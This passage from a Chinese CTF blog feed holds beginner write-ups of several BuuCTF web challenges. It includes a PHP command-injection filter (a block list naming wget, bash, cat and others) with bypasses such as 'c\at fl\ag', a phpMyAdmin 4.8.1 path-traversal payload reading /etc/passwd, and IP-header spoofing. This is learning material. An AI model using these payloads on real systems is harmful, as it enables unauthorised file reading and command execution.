day&#39;</code>，找个伪协议写进去就行：</p><p><code>?2333=data://text/plain,todat is a happy day</code>或者利用POST方式和<code>input</code>组合</p><p><code>?2333=php://input然后数据是 todat is a happy day</code></p><p>最后别忘了加个<code>IP</code>。</p><p>这个<code>payload</code>提示<code>Flag is here~But how to get it?Local access only!&lt;br/&gt;Sorry,you don&#39;t have permission!  Your ip is :sorry,this way is banned! </code>。。<code>XFF</code>头不能用，改成<code>Client-IP</code>试了试，拿到<code>flag</code>:<code>flag&#123;b5aec9ee-7acb-45a4-b8e3-fbe4ae51f2f4&#125;</code></p><p><img src="/img/taowa4.png" alt="taowa4"></p><p>然后利用<code>input</code>伪协议去写<code>todat is a happy day</code>也行，我没有尝试，这里直接借用了这位师傅的结果：</p><p>参考<code>https://www.cnblogs.com/rabbittt/p/13291746.html</code>:</p><p><img src="/img/taowa5.png" alt="taowa5"></p><p>其实这里还有个问题，我利用<code>GET</code>传参习惯在问号前面加个<code>/</code>，比如这题一开始我写的<code>secrettw.php/?balabala</code>，但发现行不通。。看来以后做题要把这个习惯改掉。</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_2</title>
    <link href="/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/"/>
    <url>/2023/10/30/BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_2/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>进环境发现是这么个东西，<code>URL</code>值得注意：</p><p><code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></p><p><img src="/img/anxunbei1.png" alt="anxunbei1"></p><p>右键源码还可以发现一行字：<code>md5 is funny ~</code>(和md5有关？)，估计是被藏到图片后面了。</p><p>先在kali下用dirsearch扫一下看看有没有其它文件：</p><p><code>dirsearch -u http://55a28404-cd69-4529-9626-2cd4d4f499d1.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>没有什么有用的信息。看看源码：</p><p><img src="/img/anxunbei3.png" alt="anxunbei3"></p><p>选中那段字符提示了base64，利用base64转图片工具转换结果就是左上角那张图片。但很明显URL中不是这个东西，应该是将文件名进行了变化。</p><p>img参数是大小写字母加数字的组合，猜测是<code>base64</code>，而且随便输个<code>abc</code>再看源码会发现这么个东西：</p><p><img src="/img/anxunbei2.png" alt="anxunbei2"></p><p>直接base64解码：<code>MzUzNTM1MmU3MDZlNjc=</code>，又是一串<code>base64</code>再解码：<code>3535352e706e67</code>。看着像十六进制，解一下：<code>555.png</code></p><p>现在这个参数怎么出来的就清楚了：字符串先经过十六进制，再经过两次base64加密。前面猜测这是个<code>include</code>的参数，因为这个<code>img</code>和<code>cmd</code>参数都是在index.php下的，那就直接看<code>index.php</code>是啥东西(用同样的方法转换):img&#x3D;<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <span class="hljs-comment">//如果两个参数其中一个没被赋值</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-comment">//img解码</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-comment">//注意^，会正则匹配非大小写字母及数字和点，换成空格</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//大小写匹配flag</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//利用file_get_contents读目标文件内容，并使用base64加密</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<span class="hljs-comment">//一开始想的数组绕过即$a[]=1而且$b[]=2，不过他前面有个(string)强制类型转换(string(5) &quot;Array&quot;)，只能找碰撞绕过了。</span><br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<span class="hljs-comment">//注意反引号，执行命令的结构直接echo</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>最开始正则匹配<code>\</code>那里没弄明白，一开始觉得<code>|\\|\\\\|</code>这俩东西就会把<code>\</code>这东西给匹配了，去网上搜了wp发现都说直接<code>l\s</code>就能绕过。后面发现自己想错了，<code>|\\|\\\\|</code>这东西并不会匹配到<code>\</code>，需要<code>\\\</code>才行。举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到\\&#x27;</span>);<span class="hljs-comment">//一个反斜杠需要另一个反斜杠进行转义，这其实是一个反斜杠</span><br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时我们传<code>?b=</code>任何值都会报错：</p><p><code> **Warning**:  preg_match(): No ending delimiter &#39;/&#39; found in **D:\phpstudy_pro\WWW\wow.php** on line **4**</code></p><p>电脑没有找到<code>/</code>这个结束定界符。想了下原因，既然<code>\</code>这个东西是转义字符，那么<code>\\</code>只不过是一个转义后的<code>\</code>，这个东西和<code>/</code>组合到一起会去正则匹配<code>/</code>这个东西，这样一来导致缺少尾部界定符。修改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\//i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这时不会报错而且回去正则匹配<code>/</code>，现在思路就清晰了：如果我们想正则匹配<code>\</code>，那么就需要<code>\\\</code>才行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>现在再看看这段正则匹配怎么个事：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意<code>|\\|\\\\|</code>，这东西相当于去匹配<code>|\\\\</code>。因为前两个<code>\\</code>回去转义后面那个分隔符<code>|</code>，再加上<code>\\\\</code>，然后以<code>|</code>收尾：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;检测到&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;没检测到&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们只有传<code>?b=|\\\\</code>才会<code>echo</code>检测到，所以我们仍可以利用<code>\</code>进行命令拼接，比如<code>l\s</code>，<code>l\s%20/</code>,<code>c\at%20fl\ag</code>等。</p><p>在burp中如果使用空格会被识别为其他的参数，所以这里空格用<code>%20</code>替换。</p><p>综上，可以进行命令执行，得到flag。</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p><img src="/img/db1.png" alt="db1"></p><p>???</p><p>用dirsearch扫一下，发现<code>robots.txt</code>还有<code>/phpmyadmin/</code>，看看都有啥：</p><p><code>robots.txt</code>提示<code>phpinfo.php</code>，<code>/phpmyadmin/</code>不登录可以直接访问数据库管理界面：</p><p><img src="/img/db2.png" alt="db2"></p><p>后面就无处下手了。。去网上查了一下<code>wp</code>，这题考的是<code>phpmyadmin4.8.1</code>版本存在任意文件读取漏洞:<code>include $_REQUEST[&#39;target&#39;];</code></p><p>直接利用现成的<code>payload</code>:<code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，发现可以进行任意文件读取。后面再翻翻<code>flag</code>的位置就行了。</p><p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code></p><p><code>flag&#123;14b071f4-a712-4a14-b3ce-d6bc07df4506&#125;</code></p><p>不过我看文章中都写了<code>$_REQUEST[&#39;target&#39;]</code>，但尝试<code>POST</code>提交拿不到结果。而且在<code>?target</code>前加个<code>/</code>就白屏了。。不过右键看源码还是能看到回显，不知道咋回事。</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>进环境发现有这么个东西：</p><p><img src="/img/flagpy1.png" alt="flagpy1"></p><p>看下源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>  hash = <span class="hljs-title function_">hex_md5</span>(code);<br>  <span class="hljs-keyword">return</span> hash;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> code = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;vcode&quot;</span>).<span class="hljs-property">value</span>;<span class="hljs-comment">//获取用户的输入</span><br>  <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">hex_md5</span>(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;./flag.php&quot;</span><span class="hljs-comment">//重定向到当前目录下的flag.php</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>看完想了一下，直接去<code>flag.php</code>看看怎么个事：</p><p><code>http://node4.buuoj.cn:25037/flag.php</code></p><p><img src="/img/flagpy2.png" alt="flagpy2"></p><p>提示保存了购买者的IP，可以利用<code>XFF</code>伪造。<code>除了购买者和我自己，没有人可以看到flag</code>，直接<code>XFF 127.0.0.1</code>试试？</p><p><img src="/img/flagpy3.png" alt="flagpy3"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>题目提示<code>unicode</code>和<code>python</code></p><p>了解了下<code>unicode</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unicode</span>是一种字符编码标准，用于表示文本中的字符。它为世界上几乎所有的字符都分配了一个唯一的数字标识，这个标识被称为<span class="hljs-string">&quot;码点&quot;</span>。Unicode的目标是为全球范围内的所有字符提供一个统一的编码方案，以解决不同国家和地区使用不同字符编码的问题。<br><br><span class="hljs-attribute">Unicode</span>使用十六进制表示每个字符的码点，例如字母<span class="hljs-string">&quot;A&quot;</span>的码点是U+<span class="hljs-number">0041</span>，汉字<span class="hljs-string">&quot;中&quot;</span>的码点是U+<span class="hljs-number">4</span>E2D。Unicode定义了超过<span class="hljs-number">130</span>,<span class="hljs-number">000</span>个码点，其中包括各种语言的字符、标点符号、符号、表情符号等。<br></code></pre></td></tr></table></figure><p><img src="/img/us1.png" alt="us1"></p><p>试了试购买前三种都提示：</p><p><img src="/img/unishop2.png" alt="unishop2"></p><p>买最后一个会显示:<code>Only one char(?) allowed!</code>，意思是这个<code>Price</code>只能填一个字符？源码里面有下面这段提示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">meta charset=&quot;utf-8&quot;&gt;<span class="hljs-comment">&lt;!--Ah,really important,seriously. --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unicorn shop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Don&#x27;t be frustrated by the same view,we&#x27;ve changed the challenge content.--&gt;</span><br></code></pre></td></tr></table></figure><p>去网上找了下wp，和提示的<code>Unicode</code>有关：先把<code>Item ID</code>和<code>Price</code>都放空，看看报错信息：</p><p><img src="/img/unishop3.png" alt="unishop3"></p><p>可以发现他用了<code>unicodedata.numeric()</code>函数去处理这个<code>price</code>，这东西会获取 Unicode 字符的数值表示，比如：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; import unicodedata<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-number">1.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;11&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-number">3.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;33&#x27;</span>)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-keyword">numeric</span>() argument <span class="hljs-number">1</span> must be <span class="hljs-keyword">a</span> unicode <span class="hljs-keyword">character</span>, <span class="hljs-keyword">not</span> str<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;𐄣&#x27;</span>)<br><span class="hljs-number">2000.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;万&#x27;</span>)<br><span class="hljs-number">10000.0</span><br></code></pre></td></tr></table></figure><p>然后利用这个网站<code>https://www.compart.com/en/unicode</code>找<code>numeric value</code>大于<code>1337</code>的就行</p><p><img src="/img/unishop4.png" alt="unishop4"></p><p>直接把目标符号复制粘贴到<code>Price</code>价格里就好了。</p><p>补充：这题源码里有段<code>price = urlib.unquote(price).decode(&#39;utf-8&#39;)</code>，即先把输入<code>url</code>解码后再经过<code>utf-8</code>编码赋值给<code>price</code>，然后用<code>unicodedata.numeric()</code>处理<code>price</code>。</p><p>所以可以通过先找目标字符的<code>utf-8</code>编码，把它转换成对应的<code>url</code>形式(把<code>0x</code>换成<code>%</code>就行，再去掉空格)</p><h2 id="网鼎杯-2020-朱雀组-Nmap-这题还没做完先放一放"><a href="#网鼎杯-2020-朱雀组-Nmap-这题还没做完先放一放" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap(这题还没做完先放一放)"></a>[网鼎杯 2020 朱雀组]Nmap(这题还没做完先放一放)</h2><p><img src="/img/nmap1.png" alt="nmap1"></p><p>一个端口扫描网站，初步猜测存在<code>RCE</code>或者文件包含。</p><p>先看源码里有啥：<code>&lt;!-- flag is in /flag --&gt;</code></p><p>嗯，那应该是要<code>RCE</code>了</p><p>随便输个<code>127.0.0.1</code>看看怎么个事：</p><p><img src="/img/namp2.png" alt="namp2"></p><p>提供了一些端口信息，这个<code>URL</code>值得注意：</p><p><code>/result.php?f=f7909</code></p><p><code>to index</code>就是返回首页，<code>to list</code>是这么个界面：</p><p><img src="/img/nmap3.png" alt="nmap3"></p><p><code>File</code>那一栏就是<code>result.php</code>底下的<code>f</code>参数，尝试了六次发现文件名应该五六位十六进制的随机数。他这东西的运行过程大概就是扫描目标<code>IP</code>的端口，然后给结果五位十六进制随机数的文件名，存储起来如果想读取利用<code>result.php</code>进行了文件包含。</p><p>不过结果中存在一个警告，抓包看看怎么个事：</p><p><img src="/img/nmap4.png" alt="nmap4"></p><p>首先，输入<code>IP</code>后会进行302重定向。</p><p>如果随便更改<code>f</code>的值呢？会出现下面的报错：</p><p><img src="/img/nmap5.png" alt="nmap5"></p><p>  <code>simplexml_load_file()</code>会把把XML 文档载入对象中，所以应该是把结果以XML文件的形式存储。</p><p><code>127.0.0.1;ls</code>提示<code>Host maybe down</code>，换成<code>127.0.0.1 ;</code>发现会给<code>;</code>前加一个<code>\</code>进行转义变成<code>127.0.0.1 \;</code>，但如果没有这个空格会直接报错<code>host maybe down</code></p><p>后面捣鼓半天不知道怎么弄了，找了<code>wp</code>发现是自己思路错了，这题考的是<code>Nmap</code>的一些用法。</p><p>还没做完先放一放。。一看这两个<code>escape</code>函数我就头疼</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" 